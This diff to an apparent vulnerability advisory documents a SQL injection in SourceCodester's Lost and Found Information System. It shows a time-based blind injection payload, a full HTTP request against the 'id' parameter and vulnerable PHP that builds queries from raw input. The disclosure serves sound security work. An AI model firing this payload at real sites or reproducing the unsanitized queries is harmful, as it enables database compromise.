@@ -23,7 +23,7 @@ A vulnerability SQL injection was found in SourceCodester Lost and Found Informa
 '+AND+(SELECT+1200+FROM+(SELECT(SLEEP(5)))pTou)+AND+'str'%3d'str
 ```
 ![image](https://github.com/nguyendinhmanh1111/CVE2023/assets/76999751/f960b8ed-1046-424f-9a6a-2c4c77183eaa)
-####Request:
+#### Request:
 ```
 GET /php-lfis/admin/?page=inquiries/view_inquiry&id=1'+AND+(SELECT+1200+FROM+(SELECT(SLEEP(5)))pTou)+AND+'str'%3d'str HTTP/1.1
 Host: 192.168.0.106
@@ -42,4 +42,23 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Cookie: PHPSESSID=0bb98mm26ain42g80sto1khd1r
 Connection: close˛
+```
+## SOURCE CODE VULNERABLE
+
+```
+<?php
+if(isset($_GET['id']) && $_GET['id'] > 0){
+    $qry = $conn->query("SELECT * from `inquiry_list` where id = '{$_GET['id']}' ");
+    if($qry->num_rows > 0){
+        foreach($qry->fetch_assoc() as $k => $v){
+            $$k=$v;
+        }
+		$conn->query("UPDATE `inquiry_list` set `status` = 1 where `id` = '{$id}'");
+    }else{
+		echo '<script>alert("inquiry ID is not valid."); location.replace("./?page=inquiries")</script>';
+	}
+}else{
+	echo '<script>alert("inquiry ID is Required."); location.replace("./?page=inquiries")</script>';
+}
+?>
 ```
